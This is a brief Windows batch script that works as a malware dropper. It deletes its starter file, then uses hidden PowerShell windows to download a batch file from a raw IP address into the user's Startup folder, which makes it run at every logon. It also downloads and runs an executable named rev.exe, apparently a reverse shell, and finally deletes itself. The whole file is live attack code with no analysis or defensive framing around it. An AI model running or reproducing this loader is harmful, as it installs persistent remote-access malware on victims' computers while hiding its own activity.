@echo off
del Starter.bat
set "currentd=%cd%"
cd "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
powershell -windowstyle hidden curl -o startup.bat http://34.88.221.44:9000/startup.bat
cd %currentd%
powershell -windowstyle hidden curl -o rev.exe http://34.88.221.44:9000/rev.exe
rev.exe
del "%~f0"
